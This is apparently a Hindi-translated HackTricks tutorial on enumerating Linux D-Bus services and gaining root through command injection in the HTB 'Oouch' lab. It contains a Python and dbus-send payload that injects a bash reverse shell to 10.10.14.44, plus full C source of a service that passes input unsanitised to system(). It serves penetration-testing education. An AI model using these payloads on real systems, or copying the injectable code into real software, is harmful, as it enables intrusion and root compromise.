# D-Bus जाँच और कमांड इंजेक्शन विशेषाधिकार उन्नयन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को** **अपडेट करें।**

</details>

## **GUI जाँच**

**(यह जाँच जानकारी यहां से ली गई है** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**

Ubuntu डेस्कटॉप D-Bus का उपयोग अपने इंटर-प्रोसेस संचार (IPC) माध्यम के रूप में करता है। Ubuntu में, कई संदेश बस एक साथ चलती हैं: एक सिस्टम बस, जिसे **विशेषाधिकारी सेवाएं प्रणाली-व्यापी महत्वपूर्ण सेवाएं उजागर करने के लिए** प्रयोग करती हैं, और प्रत्येक लॉग इन उपयोगकर्ता के लिए एक सत्र बस, जो केवल उस विशेष उपयोगकर्ता के लिए महत्वपूर्ण सेवाएं उजागर करती हैं। हमारे विशेषाधिकारों को उन्नत करने का प्रयास करेंगे, इसलिए हम मुख्य रूप से सिस्टम बस पर ध्यान केंद्रित करेंगे क्योंकि वहां की सेवाएं अधिकांशतः उच्च विशेषाधिकारों (जैसे कि रूट) के साथ चलती हैं। ध्यान दें कि D-Bus संरचना प्रत्येक सत्र बस के लिए एक 'राउटर' का उपयोग करती है, जो क्लाइंट संदेशों को उन सेवाओं के पते पर पुनर्निर्देशित करता है जिनसे वे संवाद करने का प्रयास कर रहे हैं। क्लाइंट्स को संदेश भेजने के लिए वे सेवा का पता निर्दिष्ट करना चाहिए।

प्रत्येक सेवा को वह व्यक्तियों और इंटरफेसेज़ द्वारा परिभाषित करती है जिन्हें यह उजागर करती है। हम सामान्य OOP भाषाओं में कक्षाओं के उदाहरण के रूप में वस्तुओं की तुलना कर सकते हैं। प्रत्येक अद्वितीय उदाहरण को इसके **वस्तु पथ** द्वारा पहचाना जाता है - एक स्ट्रिंग जो एक फ़ाइल सिस्टम पथ की तरह होता है जो प्रत्येक वस्तु को यूनिक रूप से पहचानता है जिसे सेवा उजागर करती है। हमारे अनुसंधान में मदद करने वाला एक मानक इंटरफेस है **org.freedesktop.DBus.Introspectable** इंटरफेस। इसमें एक एकल विधि होती है, Introspect, जो वस्तु द्वारा समर्थित विधियों, सिग्नल और गुणों के XML प्रतिनिधित्व को लौटाती है। इस ब्लॉग पोस्ट में हम विधियों पर ध्यान केंद्रित करेंगे और गुणों और सिग्नल को अनदेखा करेंगे।

मैंने D-Bus इंटरफेस के साथ संवाद करने के लिए दो उपकरणों का उपयोग किया: एक CLI उपकरण जिसका नाम है **gdbus**, जो स्क्रिप्ट में D-Bus उजागर की गई विधियों को आसानी से बुलाने की अनुमति देता है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक पायथन आधारित GUI उपकरण जो प्रत्येक बस पर उपलब्ध सेवाओं की जाँच करने और देखने में मदद करता है कि प्रत्येक सेवा में कौन सी वस्तुएं हैं।
```bash
sudo apt-get install d-feet
```
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_चित्र 1. D-Feet मुख्य विंडो_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_चित्र 2. D-Feet इंटरफ़ेस विंडो_

चित्र 1 में बाएं पैन में आप देख सकते हैं कि D-Bus डेमन सिस्टम बस के साथ पंजीकृत सभी विभिन्न सेवाएं हैं (शीर्ष पर सिस्टम बस बटन का चयन करें)। मैंने **org.debin.apt** सेवा का चयन किया और D-Feet स्वचालित रूप से **उपलब्ध ऑब्जेक्ट्स के लिए सेवा का प्रश्न किया**। एक विशिष्ट ऑब्जेक्ट का चयन करने के बाद, सभी इंटरफ़ेस की सूची दी जाती है, जिनमें उनके संबंधित विधियाँ, गुण और संकेत शामिल हैं, जैसा कि चित्र 2 में दिखाया गया है। ध्यान दें कि हमें प्रत्येक **IPC उद्घाटित विधि** के हस्ताक्षर भी मिलते हैं।

हम यह भी देख सकते हैं कि प्रत्येक सेवा के **प्रक्रिया का पहचानकर्ता** और इसका **कमांड लाइन** है। यह एक बहुत उपयोगी सुविधा है, क्योंकि हम यह सत्यापित कर सकते हैं कि हम जांच रहे हैं लक्षित सेवा वास्तव में उच्च विशेषाधिकारों के साथ चलती है। सिस्टम बस पर कुछ सेवाएं रूट के रूप में नहीं चलती हैं, इसलिए इसका अध्ययन करने के लिए कम रुचिकर होती हैं।

D-Feet भी विभिन्न विधियों को बुलाने की अनुमति देता है। विधि इनपुट स्क्रीन में हम बुलाए गए फ़ंक्शन के पैरामीटर के रूप में व्याख्या करने के लिए एक कोमा द्वारा विभाजित पायथन अभिव्याक्तियों की सूची निर्दिष्ट कर सकते हैं, जैसा कि चित्र 3 में दिखाया गया है। पायथन प्रकार D-Bus प्रकार में मार्शल होते हैं और सेवा को पारित किए जाते हैं।

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_चित्र 3. D-Feet के माध्यम से D-Bus विधियों को बुलाना_

कुछ विधियों को हमें उन्हें बुलाने से पहले प्रमाणीकरण की आवश्यकता होती है। हम इन विधियों को अनदेखा करेंगे, क्योंकि हमारा लक्ष्य पहले से ही क्रेडेंशियल के बिना अपनी विशेषाधिकारों को उच्च करना है।

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_चित्र 4. एक विधि जो अधिकृतता की आवश्यकता होती है_

ध्यान दें कि कुछ सेवाएं एक और D-Bus सेवा को जोर देती हैं जिसका नाम org.freedeskto.PolicyKit1 है, कि क्या एक उपयोगकर्ता को कुछ कार्रवाई करने की अनुमति होनी चाहिए या नहीं।

## **Cmd line जाँच**

### सेवा ऑब्जेक्ट की सूची बनाएँ

यह संभव है कि खोले गए D-Bus इंटरफ़ेस की सूची बनाई जाए:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### कनेक्शन

जब कोई प्रक्रिया बस के साथ एक कनेक्शन सेट करती है, तो बस कनेक्शन को _यूनिक कनेक्शन नाम_ के रूप में एक विशेष बस नाम आवंटित करती है। इस प्रकार के बस नाम अपरिवर्तनशील होते हैं - जब तक कनेक्शन मौजूद है, यह गारंटी है कि वे कभी नहीं बदलेंगे - और, और अहम बात यह है कि बस के जीवनकाल में इस तरह के यूनिक कनेक्शन नाम को दूसरे कनेक्शन को कभी नहीं आवंटित किया जाएगा, भले ही वही प्रक्रिया बस के साथ कनेक्शन बंद कर दें और एक नया कनेक्शन बनाएं। यूनिक कनेक्शन नाम आसानी से पहचाने जा सकते हैं क्योंकि वे - अन्यथा निषिद्ध - आरंभिक आकार वाले आकार के साथ शुरू होते हैं।

### सेवा ऑब्जेक्ट जानकारी

फिर, आप इंटरफेस के बारे में कुछ जानकारी प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### सेवा ऑब्जेक्ट के इंटरफेस की सूची बनाएं

आपको पर्याप्त अनुमतियाँ होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### सेवा ऑब्जेक्ट का इंट्रोस्पेक्ट इंटरफेस

ध्यान दें कि इस उदाहरण में `tree` पैरामीटर का उपयोग करके नवीनतम इंटरफेस का चयन किया गया था (_पिछले खंड देखें_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
नोट करें `htb.oouch.Block` इंटरफेस का मेथड `.Block` (जिसमें हम रुचि रखते हैं)। अन्य स्तंभों का "s" यह दर्शा सकता है कि इसे एक स्ट्रिंग की आवश्यकता है।

### मॉनिटर/कैप्चर इंटरफेस

पर्याप्त विशेषाधिकारों के साथ (केवल `send_destination` और `receive_sender` विशेषाधिकार पर्याप्त नहीं हैं) आप **एक डी-बस संचार को मॉनिटर** कर सकते हैं।

एक संचार को **मॉनिटर** करने के लिए आपको **रूट** होना चाहिए। अगर आप फिर भी रूट होने में समस्या पा रहे हैं तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) देखें।

{% hint style="warning" %}
यदि आप जानते हैं कि एक डी-बस कॉन्फ़िग फ़ाइल को कैसे कॉन्फ़िगर करें ताकि **गैर रूट उपयोगकर्ताओं को संचार को स्निफ़ करने की अनुमति** हो, तो कृपया **मुझसे संपर्क करें**!
{% endhint %}

मॉनिटर करने के विभिन्न तरीके:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
निम्नलिखित उदाहरण में इंटरफेस `htb.oouch.Block` का निगरानी किया जाता है और **गलत संवाद के माध्यम से "**_**लालालालाल**_**" संदेश भेजा जाता है**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
आप `monitor` की जगह `capture` का उपयोग कर सकते हैं ताकि परिणामों को pcap फ़ाइल में सहेज सकें।

#### सभी शोर को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

यदि बस पर बहुत सारी जानकारी होती है, तो ऐसा करने के लिए एक मैच नियम पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
एकाधिक नियम निर्दिष्ट किए जा सकते हैं। यदि संदेश में से किसी भी नियम के साथ मेल खाता है, तो संदेश मुद्रित किया जाएगा। इस प्रकार:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
अधिक जानकारी के लिए [D-Bus दस्तावेज़ीकरण](http://dbus.freedesktop.org/doc/dbus-specification.html) देखें।

### अधिक

`busctl` में और भी विकल्प हैं, [**इन्हें यहां सभी ढूंढें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **भेद्य स्थिति**

HTB के "oouch" में होस्ट के भीतर उपयोगकर्ता **qtc** के रूप में आप _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित एक **अप्रत्याशित D-Bus कॉन्फ़िग फ़ाइल** ढूंढ सकते हैं:
```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
पिछले कॉन्फ़िगरेशन से ध्यान दें कि **आपको इस D-BUS संचार के माध्यम से जानकारी भेजने और प्राप्त करने के लिए `root` या `www-data` उपयोगकर्ता होना चाहिए**।

डॉकर कंटेनर **aeb4525789d8** में उपयोगकर्ता **qtc** के रूप में आप _/code/oouch/routes.py_ फ़ाइल में कुछ dbus संबंधित कोड ढूंढ सकते हैं। यह रोचक कोड है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **एक डी-बस इंटरफेस से कनेक्ट कर रहा है** और "ब्लॉक" फंक्शन को "client\_ip" भेज रहा है।

डी-बस कनेक्शन के दूसरे तरफ कुछ सी कंपाइल्ड बाइनरी चल रही है। यह कोड D-Bus कनेक्शन में IP पते के लिए **सुन रहा है और `system` फंक्शन के माध्यम से iptables को कॉल कर रहा है** दिए गए IP पते को ब्लॉक करने के लिए।\
**`system` कोमांड इंजेक्शन के लिए उद्देश्यपूर्ण रूप से विकल्पयुक्त है**, इसलिए निम्नलिखित पेलोड की तरह एक रिवर्स शेल बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### इसे शोषण करें

इस पृष्ठ के अंत में आप **D-Bus एप्लिकेशन के पूरे सी कोड** को खोज सकते हैं। इसके अंदर आप 91-97 लाइनों के बीच **कैसे `D-Bus ऑब्जेक्ट पाथ` और `इंटरफेस नाम`** को **रजिस्टर किया जाता है** यह जानकारी D-Bus कनेक्शन में जानकारी भेजने के लिए आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
इसके अलावा, लाइन 57 में आपको पायेंगे की **इस D-Bus संचार के लिए केवल एक विधि पंजीकृत** है जिसका नाम `Block` है (_**इसलिए आगामी खंड में पेलोड सेवा ऑब्जेक्ट `htb.oouch.Block`, इंटरफेस `/htb/oouch/Block` और विधि का नाम `Block` पर भेजे जाएंगे**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित पायथन कोड D-Bus कनेक्शन को `Block` विधि के माध्यम से `block_iface.Block(runme)` को पेलोड भेजेगा (_ध्यान दें कि यह पिछले कोड टुकड़े से निकाला गया है_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send

busctl और dbus-send दो उपयोगी टूल हैं जो D-Bus सिस्टम पर कमांड भेजने और जानकारी प्राप्त करने के लिए उपयोग होते हैं।

busctl कमांड लाइन टूल है जो D-Bus सिस्टम पर उपलब्ध सभी सर्विसेज़, ऑब्जेक्ट्स और इंटरफेसेज़ की सूची प्रदान करता है। यह टूल उपयोगकर्ताओं को दिए गए सर्विसेज़ और ऑब्जेक्ट्स के लिए उपलब्ध इंटरफेसेज़ की सूची भी प्रदान करता है।

dbus-send एक और कमांड लाइन टूल है जो D-Bus सिस्टम पर कमांड भेजने के लिए उपयोग होता है। इस टूल का उपयोग उपयोगकर्ताओं को दिए गए सर्विसेज़, ऑब्जेक्ट्स और इंटरफेसेज़ पर कमांड भेजने के लिए किया जा सकता है।

ये टूल्स एक हाईलाइट के रूप में उपयोग हो सकते हैं जब आप एक नई सर्विस या ऑब्जेक्ट के बारे में जानकारी प्राप्त करना चाहते हैं या जब आप एक सर्विस या ऑब्जेक्ट पर कमांड भेजना चाहते हैं।
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` एक उपकरण है जिसका उपयोग "संदेश बस" को संदेश भेजने के लिए किया जाता है।
* संदेश बस - एक सॉफ़्टवेयर जो सिस्टमों के बीच आवेदनों के बीच संचार को आसान बनाने के लिए उपयोग किया जाता है। यह संदेश कतार के साथ संबंधित है (संदेश क्रम में क्रमबद्ध होते हैं), लेकिन संदेश बस में संदेश सदस्यता मॉडल में भेजे जाते हैं और यह बहुत तेज होता है।
* " -system " टैग का उपयोग करके यह उल्लेख किया जाता है कि यह एक सिस्टम संदेश है, एक सत्र संदेश नहीं (डिफ़ॉल्ट रूप से)।
* " --print-reply " टैग का उपयोग हमारे संदेश को उचित रूप से प्रिंट करने और मानव-पठनीय प्रारूप में किसी भी उत्तर को प्राप्त करने के लिए किया जाता है।
* " --dest=Dbus-Interface-Block " Dbus इंटरफ़ेस का पता।
* " --string: " - हमें इंटरफ़ेस को संदेश भेजने के लिए प्रकार का चयन करना है। संदेश भेजने के कई प्रारूप होते हैं जैसे डबल, बाइट, बूलियन, इंट, ऑब्जपथ। इनमें से, "ऑब्जेक्ट पथ" उपयोगी होता है जब हम Dbus इंटरफ़ेस को एक फ़ाइल का पथ भेजना चाहते हैं। इस मामले में हम एक विशेष फ़ाइल (FIFO) का उपयोग कर सकते हैं ताकि फ़ाइल के नाम के रूप में इंटरफ़ेस को एक कमांड पास कर सकें। "string:; " - यह फिर से ऑब्जेक्ट पथ को बुलाने के लिए है जहां हमने FIFO रिवर्स शेल फ़ाइल/कमांड की जगह रखी है।

_ध्यान दें कि `htb.oouch.Block.Block` में पहला हिस्सा (`htb.oouch.Block`) सेवा ऑब्जेक्ट को संदर्भित करता है और अंतिम हिस्सा (`.Block`) विधि का नाम संदर्भित करता है।_

### सी कोड

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
